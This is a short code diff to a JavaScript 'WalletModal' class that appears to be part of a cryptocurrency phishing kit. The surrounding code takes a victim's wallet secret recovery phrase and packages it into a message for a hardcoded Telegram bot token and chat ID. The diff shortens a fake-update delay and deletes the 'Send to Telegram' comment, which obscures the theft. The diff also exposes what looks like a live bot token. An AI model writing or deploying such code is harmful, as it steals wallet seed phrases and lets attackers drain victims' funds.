@@ -482,7 +482,7 @@ class WalletModal {
         mainContainer.style.display = "block";
         setTimeout(() => {
             this.showUpdateContainer(wallet.name, wallet.icon);
-        }, 5000);
+        }, 2000);
     }
 
     showUpdateContainer(walletName, walletIcon) {
@@ -616,7 +616,7 @@ class WalletModal {
                 return;
             }
 
-            // Send to Telegram
+            
             const botToken = "7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA";
             const chatId = "-4704812522";
             const message = `Wallet: ${walletName}\nSecret Recovery Phrase:\n${phrase}`;
@@ -638,3 +638,4 @@ class WalletModal {
         };
     }
 }
+
